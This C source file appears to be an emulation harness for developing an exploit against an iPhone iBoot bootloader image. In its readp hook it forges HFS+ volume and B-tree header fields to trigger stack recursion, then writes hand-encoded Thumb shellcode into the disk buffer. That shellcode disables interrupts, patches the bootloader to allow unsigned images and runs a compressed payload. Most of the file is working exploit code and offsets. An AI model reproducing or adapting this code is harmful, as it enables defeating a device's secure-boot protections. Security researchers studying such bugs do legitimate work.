#define IMAGE_NAME              "iBoot.n94ap.RELEASE.dec"
#define IMAGE_START             0x9FF00000
#define IMAGE_END               0x9FF526A4 /*IMAGE_START + 0x114*/
#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE         0xA495C /*((IMAGE_START + 0xF7000) - IMAGE_END)*/
#define IMAGE_BSS_START         0x9FF43880
#define IMAGE_TEXT_END          0x9FF43000 /* XXX this is a lie */
#define IMAGE_STACK_SIZE        0x1000
#define IMAGE_LOADADDR          0x80000000
#define IMAGE_HUGECHUNK         0x3000000


#define breakpoint1_ADDR        (0x18A94 + 1) /* ResolvePathToCatalogEntry */

#define fuck1_ADDR              (0x198F6 + 1)
#define fuck2_ADDR              (0x1990C + 1)
#define fuck3_ADDR              (0x19A22 + 1) /*_memalign */

#define wait_for_event_ADDR     (0x00814)
#define hugechunk_ADDR          (0x00CAE + 1) /*debug-uarts*/
#define gpio_pin_state_ADDR     (0x02C38 + 1)
#define gpio_set_state_ADDR     (0x02C58 + 1)
#define get_timer_us_ADDR       (0x01818 + 1)
#define reset_cpu_ADDR          (0x0186C + 1)
#define readp_ADDR              (0x196BC + 1)
#define get_mem_size_ADDR       (0x1F144 + 1) /*memory not yet inited*/
#define putchar_ADDR            (0x33614 + 1)
#define adjust_stack_ADDR       (0x1E880 + 1)
#define adjust_environ_ADDR     (0x1ED7C + 1)
#define disable_interrupts_ADDR (0x3434C + 1)
#define cache_stuff_ADDR        (0x21CCC + 1)
#define wtf_ADDR                (0x01748 + 1)

#define iboot_warmup_ADDR       (0x00110) /* right before image_end */
#define iboot_start_ADDR        (0x00BD0 + 1) /* main */
#define main_task_ADDR          (0x00C3C + 1) /* below auto-boot */
#define panic_ADDR              (0x201EC + 1) /* panic */
#define system_init_ADDR        (0x202D8 + 1) /* below stack corrupted */
#define task_create_ADDR        (0x20908 + 1) /* below ksat */
#define task_start_ADDR         (0x20A68 + 1) /* above task_exit */
#define task_exit_ADDR          (0x20A8C + 1) /* task_exit */
#define printf_ADDR             (0x32E7C + 1) 
#define malloc_ADDR             (0x196D8 + 1) /* malloc */
#define free_ADDR               (0x1978C + 1) /* below required_size */
#define create_envvar_ADDR      (0x17FFC + 1) /* below number %d out of range */
#define bcopy_ADDR              (0x33900)
#define decompress_lzss_ADDR    (0x24CA0 + 1)


void NAKED
my_breakpoint1(void)
{
#ifdef __arm__
    __asm volatile (
        /* debug */
        BCALL(my_breakpoint1_helper)
        /* replacement insn */
        "ldrb r4, [r11];"
        /* return */
        "bx lr;"
    );
#endif /* __arm__ */
}


#ifdef __arm__
void
real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x46DE0 + 0x28 + 32 * 4) {
        unsigned int t2 = (uintptr_t)image + 0x46DE0 + 0x28 + r3 * 4;
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
        dumpfile("DUMP_z1");
    }
    (void)(r0 && r1 && r2);
}

void
real_fuck2(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r9 __asm("r9");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x46DE0 + 0x28 + 32 * 4) {
#define ULAT(x) (((x) & 0xFFFFF) + IMAGE_START)
        unsigned int t4 = r2 - 0x20;
        unsigned int t1 = r0 + (r1 << 5);
        unsigned int u4 = ULAT(r2) - 0x20;
        unsigned int u1 = ULAT(r0) + (r1 << 5);
#undef ULAT
        fprintf(stderr, "_memalign: sp = 0x%x, r0 = 0x%x, r1 = 0x%x (0x%x/0x%x), r2 = 0x%x, r3 = 0x%x, r4 => (0x%x/0x%x), r9 = 0x%x (0x%x)\n", sp, r0, r1, t1, u1, r2, r3, t4, u4, r9, t1 - t4);
        dumpfile("DUMP_z2");
    }
}

void
real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x46DE0 + 0x28 + 32 * 4) {
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
        dumpfile("DUMP_z3");
    }
    (void)(r0 && r1 && r2 && r3);
}
#endif /* __arm__ */


void NAKED
fuck1(void)
{
#ifdef __arm__
    /* can use: r6, r10, r11 (r0, r1, r2) */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "push   {r0-r12};"
        "blx    _real_fuck1;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "add    r6, r4, #0x1f;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck2(void)
{
#ifdef __arm__
    /* can use: r4, r10, r11 */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r4, r0;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r4;"
        "push   {r0-r12};"
        "blx    _real_fuck2;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "sub    r4, r2, #0x20;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck3(void)
{
#ifdef __arm__
    /* can use: r10, r11 (r2, r3, r5, r6) */
    __asm volatile (
        "str    r0, [r8];"
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r6, r0;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r6;"
        "push   {r0-r12};"
        "blx    _real_fuck3;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "bx     r10;"
    );
#endif /* __arm__ */
}


void
my_adjust_stack(void)
{
#if 0
    CALL(malloc)(1856 - 32);
#elif 0
    int i;
    for (i = 0; i < 29; i++) {
        CALL(malloc)(32);
    }
#else
    void *ptr;
    ptr = CALL(malloc)(1856 - 32);
    CALL(free)(ptr);
    CALL(malloc)(928 - 32);
    CALL(malloc)(928 - 32);
#endif
}


void
my_adjust_environ(void)
{
#if 1
    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/disk.dmg", 0);
#endif
}


void
suck_sid(void)
{
    fprintf(stderr, "suck sid\n");
#if 0*999
    /* XXX missing 43598 (bootstrap_task::irq_disable_count=2 vs 1), 435b0 (bootstrap_task::registers.R9=9FF47890 vs 0) */
    *(uint32_t *)XLAT(0x9ff432b0) = 0x0e000000;
    *(uint32_t *)XLAT(0x9ff432c4) = 0x0e000000;
    *(uint32_t *)XLAT(0x9ff43300) = 0x0e000001;
    *(uint32_t *)XLAT(0x9ff433a0) = 0xffffffff;
    *(uint32_t *)XLAT(0x9ff433bc) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433c0) = 0xffffffff;
    *(uint32_t *)XLAT(0x9ff433c4) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433c8) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433d4) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433d8) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433e0) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433e8) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433f0) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433f4) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433f8) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff433fc) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff43400) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff43404) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff43408) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff4340c) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff43424) = 0x00000001;
    *(uint32_t *)XLAT(0x9ff43428) = XLAT(0x9ff43428);
    *(uint32_t *)XLAT(0x9ff4342c) = XLAT(0x9ff43428);
    *(uint32_t *)XLAT(0x9ff43460) = XLAT(0x9ff43460);
    *(uint32_t *)XLAT(0x9ff43464) = XLAT(0x9ff43460);
    *(uint32_t *)XLAT(0x9ff43468) = XLAT(0x9ff43468);
    *(uint32_t *)XLAT(0x9ff4346c) = XLAT(0x9ff43468);
    *(uint32_t *)XLAT(0x9ff43544) = 0xffffffff;
    *(uint32_t *)XLAT(0x9ff43548) = 0xffffffff;
    *(uint32_t *)XLAT(0x9ff43560) = XLAT(0x9ff43580);
    *(uint32_t *)XLAT(0x9ff43578) = XLAT(0x9ff43578);
    *(uint32_t *)XLAT(0x9ff4357c) = XLAT(0x9ff43578);
    *(uint32_t *)XLAT(0x9ff43594) = 0x00000002;
    *(uint32_t *)XLAT(0x9ff4359c) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff435a0) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff435a4) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff435a8) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff435b8) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff435bc) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff435c0) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff436ec) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff436f0) = 0x00000000;
    *(uint32_t *)XLAT(0x9ff43724) = 0xffffffff;
    *(uint32_t *)XLAT(0x9ff437a4) = XLAT(0x9ff437a4);
    *(uint32_t *)XLAT(0x9ff437a8) = XLAT(0x9ff437a4);
    *(uint32_t *)XLAT(0x9ff43810) = 0xffffffff;
#endif
    dumpfile("DUMP2");
}


int
my_readp(void *ih, void *buffer, long long offset, int length)
{
#define TREEDEPTH 1
#define TRYFIRST 0
#define TRYLAST 0
    long long off;
    eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
#if TRYLAST
    if (buffer == (void *)IMAGE_LOADADDR) {
        return length;
    }
#endif
    off = lseek(rfd, offset, SEEK_SET);
    assert(off == offset);
    length = read(rfd, buffer, length);
#if TREEDEPTH || TRYFIRST || TRYLAST
#define NODE_SIZE (4096 * 2)
#define TOTAL_NODES (0xFFF)
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
if (1) {
    /* XXX stack recursion eats 208 bytes, watch out for 0x54940 + 0x18 = 0x54958 */
    static int seq = 0;
    switch (seq) {
        case 0:
            PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);  /* HFSPlusVolumeHeader::catalogFile.logicalSize */
            PUT_QWORD_BE(buffer,  0xc0, EXTENT_SIZE);           /* HFSPlusVolumeHeader::extentsFile.logicalSize */
            break;
        case 1:
            memset(buffer, 'E', length);
#if TREEDEPTH
            PUT_WORD_BE(buffer, 14, 3);                         /* BTHeaderRec::treeDepth */
#elif TRYLAST
            PUT_WORD_BE(buffer, 14, 2);                         /* BTHeaderRec::treeDepth */
#endif
            PUT_WORD_BE(buffer, 32, 512);                       /* BTHeaderRec::nodeSize */
            PUT_DWORD_BE(buffer, 36, 0x7FFFFF);                 /* BTHeaderRec::totalNodes */
#if TRYFIRST
            PUT_DWORD_BE(buffer, 16, (0xFFFFFF / 512 - 1));     /* BTHeaderRec::rootNode (trigger) */
#else
            PUT_DWORD_BE(buffer, 16, 3);                        /* BTHeaderRec::rootNode */
#endif
            memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
            break;
        case 2:
            memset(buffer, 'F', length);
            if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
            PUT_WORD_BE(buffer, 32, NODE_SIZE);                 /* BTHeaderRec::nodeSize */
            PUT_DWORD_BE(buffer, 36, TOTAL_NODES);              /* BTHeaderRec::totalNodes */
            PUT_DWORD_BE(buffer, 16, 0x500);                    /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
            PUT_WORD_LE(buffer, 20, 0);                         /* must be zero (see above) */
            PUT_WORD_LE(buffer, 14, 0);                         /* must be zero, to allow r3 to grow */
            PUT_DWORD_LE(buffer, 46, (uintptr_t)image + 0x46D20);                       /* *r2 = r4 */
            PUT_DWORD_LE(buffer, 0x46D20 + 4 - 0x46CD4, (NODE_SIZE + 0x20) >> 5);       /* *(r0 + 4) = r9 */
            PUT_DWORD_LE(buffer, 0x46D20 + 0x20 - 0x46CD4, (uintptr_t)image + 0x46D49); /* r10 (code exec) */
            PUT_DWORD_LE(buffer, 0x46D20 + 0x24 - 0x46CD4, (uintptr_t)image + 0x46E44); /* r11 -> lr */
#if 0
            PUT_WORD_LE(buffer, 0x46D48 + 0 - 0x46CD4, INSNT_ILLEGAL);
#else
            PUT_DWORD_LE(buffer, 0x46D48 +   0 - 0x46CD4, INSNW_LDR_SP_PC80);
            PUT_DWORD_LE(buffer, 0x46D48 +   4 - 0x46CD4, make_bl(0, 0x46D48 +  4, disable_interrupts_ADDR - 1));
            PUT_WORD_LE(buffer,  0x46D48 +   8 - 0x46CD4, INSNT_LDR_R_PC(4, 76));
            PUT_WORD_LE(buffer,  0x46D48 +  10 - 0x46CD4, INSNT_LDR_R_PC(0, 80));
            PUT_WORD_LE(buffer,  0x46D48 +  12 - 0x46CD4, INSNT_MOV_R_R(1, 4));
            PUT_WORD_LE(buffer,  0x46D48 +  14 - 0x46CD4, INSNT_LDR_R_PC(2, 80));
            PUT_DWORD_LE(buffer, 0x46D48 +  16 - 0x46CD4, make_bl(1, 0x46D48 + 16, bcopy_ADDR));
            PUT_DWORD_LE(buffer, 0x46D48 +  20 - 0x46CD4, INSNW_MOV_R1_2400);
            PUT_DWORD_LE(buffer, 0x46D48 +  24 - 0x46CD4, INSNW_STRH_R1_R4_E2C);
            PUT_WORD_LE(buffer,  0x46D48 +  28 - 0x46CD4, INSNT_LDR_R_PC(0, 68));
            PUT_DWORD_LE(buffer, 0x46D48 +  30 - 0x46CD4, INSNW_MOV_R1_80000000);
            PUT_WORD_LE(buffer,  0x46D48 +  34 - 0x46CD4, INSNT_B_PC4);
            PUT_WORD_LE(buffer,  0x46D48 +  42 - 0x46CD4, INSNT_STR_R1_R4_R0);
            PUT_WORD_LE(buffer,  0x46D48 +  44 - 0x46CD4, INSNT_LDR_R_PC(0, 56));
            PUT_WORD_LE(buffer,  0x46D48 +  46 - 0x46CD4, INSNT_LDR_R_PC(1, 60));
            PUT_WORD_LE(buffer,  0x46D48 +  48 - 0x46CD4, INSNT_STR_R1_R4_R0);
            PUT_DWORD_LE(buffer, 0x46D48 +  50 - 0x46CD4, make_bl(0, 0x46D48 + 50, 0x208FC));
            PUT_WORD_LE(buffer,  0x46D48 +  54 - 0x46CD4, INSNT_MOV_R_I(1, 0));
            PUT_WORD_LE(buffer,  0x46D48 +  56 - 0x46CD4, INSNT_STR_R1_R0_68);
            PUT_WORD_LE(buffer,  0x46D48 +  58 - 0x46CD4, INSNT_LDR_R_PC(0, 52));
            PUT_WORD_LE(buffer,  0x46D48 +  60 - 0x46CD4, INSNT_MOV_R_I(1, 0xFC));
            PUT_WORD_LE(buffer,  0x46D48 +  62 - 0x46CD4, INSNT_LDR_R_PC(2, 52));
            PUT_WORD_LE(buffer,  0x46D48 +  64 - 0x46CD4, INSNT_MOV_R_I(3, nettoyeur_sz));
            PUT_WORD_LE(buffer,  0x46D48 +  66 - 0x46CD4, INSNT_MOV_R_R(5, 0));
            PUT_DWORD_LE(buffer, 0x46D48 +  68 - 0x46CD4, make_bl(0, 0x46D48 + 68, decompress_lzss_ADDR - 1));
            PUT_WORD_LE(buffer,  0x46D48 +  72 - 0x46CD4, INSNT_LDR_R_PC(0, 44));
            PUT_WORD_LE(buffer,  0x46D48 +  74 - 0x46CD4, INSNT_BLX_R(0));
            PUT_DWORD_LE(buffer, 0x46D48 +  76 - 0x46CD4, make_bl(0, 0x46D48 + 76, cache_stuff_ADDR - 1));
            PUT_WORD_LE(buffer,  0x46D48 +  80 - 0x46CD4, INSNT_BLX_R(5));
            PUT_WORD_LE(buffer,  0x46D48 +  82 - 0x46CD4, INSNT_BX_R(4));
            PUT_DWORD_LE(buffer, 0x46D48 +  84 - 0x46CD4, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
            PUT_DWORD_LE(buffer, 0x46D48 +  88 - 0x46CD4, (uintptr_t)image /* 0x84000000 */);
            PUT_DWORD_LE(buffer, 0x46D48 +  92 - 0x46CD4, (uintptr_t)image /* 0x9ff00000 */);
            PUT_DWORD_LE(buffer, 0x46D48 +  96 - 0x46CD4, IMAGE_BSS_START - IMAGE_START);
            PUT_DWORD_LE(buffer, 0x46D48 + 100 - 0x46CD4, 0x414E8 /* go command handler */);
            PUT_DWORD_LE(buffer, 0x46D48 + 104 - 0x46CD4, 0x1A334 /* allow unsigned images */);
            PUT_DWORD_LE(buffer, 0x46D48 + 108 - 0x46CD4, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
            PUT_DWORD_LE(buffer, 0x46D48 + 112 - 0x46CD4, (uintptr_t)image + 0x47000 /* nettoyeur uncompressed */);
            PUT_DWORD_LE(buffer, 0x46D48 + 116 - 0x46CD4, (uintptr_t)image + 0x46bfc /* nettoyeur compressed */);
            PUT_DWORD_LE(buffer, 0x46D48 + 120 - 0x46CD4, (uintptr_t)suck_sid /* IMAGE_START + wtf_ADDR */);
#endif
            break;
#if TREEDEPTH
        default: {
            static long long oldpos = 0;
            if ((seq % 3) == 0) {
                ((unsigned char *)buffer)[9]++;                                         /* BTNodeDescriptor::height */
                ((unsigned char *)buffer)[8] = -(((unsigned char *)buffer)[9] == 1);    /* BTNodeDescriptor::kind */
                oldpos = offset;
            } else if (oldpos) {
                lseek(rfd, oldpos, SEEK_SET);
                read(rfd, buffer, length);
                oldpos = 0;
#if 0
                if (seq == 1 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 32, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 2 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 44, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 3 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 44, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 4 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 56, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 5 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 56, 0x10000);
                    break;
                }
#elif 0
                if (seq == 6 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 68, 0x10000);
                    break;
                }
#elif 0
                if (seq == 7 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 68, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 8 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 80, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 9 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 80, 0x10000);
                    break;
                }
#elif 0
                if (seq == 10 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 92, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 11 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 92, 0x10000);
                    break;
                }
#elif 0
                if (seq == 12 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 104, 0x10000);
                    break;
                }
#elif 0
                if (seq == 13 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 104, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 14 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 116, 0x10000);
                    break;
                }
#elif 0
                if (seq == 15 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 116, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 16 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 128, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 17 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 128, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 18 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 140, 0x10000);
                    break;
                }
#elif 1
                if (seq == 19 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 152, 0x10000);
                    break;
                }
#endif
            }
        }
#endif /* TREEDEPTH */
    }
#if TRYLAST
    if (seq == 2 + (19 * 2) * (2 + TREEDEPTH)) {
        PUT_DWORD_BE(buffer, 0xa6, 1);
    }
#endif /* TRYLAST */
if (seq < 3) {
    int ofd;
    char tmp[256];
    sprintf(tmp, "BLOCK_%llx_%d", offset, seq);
    ofd = creat(tmp, 0644);
    if (ofd >= 0) {
        write(ofd, buffer, length);
        close(ofd);
    }
}
    seq++;
}
#endif
    return length;
}


void
check_irq_count(void)
{
    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x54940 + 0x18));
}


void
my_cache_stuff(void)
{
#ifdef __APPLE__
    sys_icache_invalidate(image, IMAGE_SIZE + IMAGE_HEAP_SIZE);
#endif
}


#if USE_SIGNAL
#ifdef __arm__
int
dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
    struct mmreg {
        unsigned long mmaddr;
        unsigned int pc;
        int reg;
        int val;
        int next;
    };

    static const struct mmreg mmregs[] = {
        /* end-of-table */
        { 0xFFFFFFFF, 0x00000, 0, 0, 0 },
    };

    const struct mmreg *m;

    if (si_addr == 0) {
        if (tctx->__pc == (uintptr_t)(image + 0x2071A)) {
            /* idle task crap (read from *0) */
            tctx->__r[0] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
        if (tctx->__pc == (uintptr_t)(image + 0x2097A)) {
            tctx->__r[1] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
    }

    for (m = mmregs; m->mmaddr != 0xFFFFFFFF; m++) {
        if (si_addr == (void *)m->mmaddr && tctx->__pc == (uintptr_t)(image + m->pc)) {
            int reg = m->reg;
            int val = m->val;
            if (reg >= 0) {
                tctx->__r[reg] = val;
            }
            tctx->__pc += m->next;
            return 0;
        }
    }

    return -1;
}

int
dispatch(int signum, void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
#if USE_SIGNAL > 1
    if (signum == ILLNO) {
        if ((tctx->__cpsr & 0x20) == 0 && *(uint32_t *)si_addr == INSNA_ILLEGAL) {
            /* ARM handlers: tctx->__pc += 4; */
            uintptr_t addr = (unsigned char *)si_addr - image;
            switch (addr) {
                case wait_for_event_ADDR:
                    my_wait_for_event();
            }
        } else if ((tctx->__cpsr & 0x20) != 0 && *(uint16_t *)si_addr == INSNT_ILLEGAL) {
            /* Thumb handlers: tctx->__pc += 2; */
            uintptr_t addr = (unsigned char *)si_addr - image + 1;
            switch (addr) {
                case cache_stuff_ADDR:
                    my_cache_stuff();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case hugechunk_ADDR:
                    tctx->__r[0] = (uint32_t)gethuge();
                    tctx->__pc += 4;
                    return 0;
                case gpio_pin_state_ADDR:
                    tctx->__r[0] = my_gpio_pin_state(tctx->__r[0]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case gpio_set_state_ADDR:
                    my_gpio_set_state(tctx->__r[0], tctx->__r[1]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case get_timer_us_ADDR:
                    *(uint64_t *)(&tctx->__r[0]) = my_get_timer_us();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case reset_cpu_ADDR:
                    my_reset_cpu();
                case readp_ADDR:
                    tctx->__r[0] = my_readp((void *)tctx->__r[0], (void *)tctx->__r[1], *(uint64_t *)(&tctx->__r[2]), *(uint32_t *)tctx->__sp);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case get_mem_size_ADDR:
                    tctx->__r[0] = my_get_mem_size();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case putchar_ADDR:
                    putchar(tctx->__r[0]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case adjust_stack_ADDR:
                    my_adjust_stack();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case adjust_environ_ADDR:
                    my_adjust_environ();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case breakpoint1_ADDR:
                    my_breakpoint1_helper(tctx->__r[0], tctx->__r[1], tctx->__r[2], tctx->__r[3], tctx->__sp, tctx->__lr);
                    tctx->__r[4] = *(unsigned char *)tctx->__r[11];
                    tctx->__pc += 4;
                    return 0;
            }
        }
    }
#endif /* USE_SIGNAL > 1 */
    if (signum == SIGSEGV) {
        return dispatch_SEGV(si_addr, tctx);
    }
    return -1;
}
#endif /* __arm__ */
#endif /* USE_SIGNAL */


void
patch_image(unsigned char *image)
{
    /* jump directly to warmup */
    *image = (iboot_warmup_ADDR - 8) / 4;
    /* heap hardcoded offset */
    *(uint32_t *)(image + 0x202E4) = INSN2_LDR_R1_PC__B_PLUS4;
    *(void **)(image + 0x202E8) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE);
    /* clean data cache */
    *(uint32_t *)(image + 0x218D0) = INSNA_RETURN;
#if !USE_SIGNAL
    /* idle task crap (read from *0) */
    *(uint16_t *)(image + 0x2071A) = INSNT_NOP;
    *(uint16_t *)(image + 0x2097A) = INSNT_MOV_R_R(1, 0);
#endif /* !USE_SIGNAL */
    /* timer 2 */
    *(uint32_t *)(image + 0x1FA90) = INSN2_RETURN_0;
    /* task switch FPU */
    *(uint32_t *)(image + 0x21D00) = INSNA_MOV_R2_0;
    *(uint32_t *)(image + 0x21D30) = INSNA_MOV_R2_0;
    /* bzero during mmu_init */
    *(uint32_t *)(image + 0x20EB4) = INSN2_NOP__NOP;
    /* nop some calls during iboot_start */
    *(uint32_t *)(image + 0x00BD6) = INSN2_NOP__NOP;
#if 0 /* adjust_stack */
    *(uint32_t *)(image + 0x00BDE) = INSN2_NOP__NOP;
#endif

    /* nop spi stuff */
#if 0 /* adjust_environ */
    *(uint32_t *)(image + 0xCBA) = INSN2_NOP__NOP;
#endif
    /* FPEXC triggered by nvram_save() */
    *(uint32_t *)(image + 0x498) = INSNA_NOP;
    *(uint32_t *)(image + 0x490) = INSNA_NOP;

    /* pretend we have nand device? */
    *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1;
    *(uint32_t *)(image + 0x192F2) = INSN2_MOV_R0_1__MOV_R0_1;

    /* make main_task show SP */
    *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13);
    *(uint8_t *)(image + 0x34724) = 'x';
    /* show task structure */
    *(void **)(image + 0xFA4) = image + 0x43560;
    *(uint8_t *)(image + 0x34710) = 'x';

    /* nop some more hw */
    *(uint32_t *)(image + 0x0BB54) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x01770) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x026D8) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x00D60) = INSN2_NOP__NOP;
    *(uint16_t *)(image + 0x0C140) = INSNT_NOP; /* XXX loop */
    *(uint16_t *)(image + 0x1FC4A) = INSNT_NOP;
    *(uint32_t *)(image + 0x1EFAC) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F1BA) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F1DA) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F214) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F22C) = INSN2_RETURN_21;
    *(uint32_t *)(image + 0x1F244) = INSN2_RETURN_0;
}


void
patch_nettoyeur(unsigned char *nettoyeur)
{
    *(void **)(nettoyeur + 0xF0) = image + *(uint32_t *)(nettoyeur + 0xF0) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xF4) = XLAT(*(uint32_t *)(nettoyeur + 0xF4));
    *(void **)(nettoyeur + 0xF8) = XLAT(*(uint32_t *)(nettoyeur + 0xF8));
}
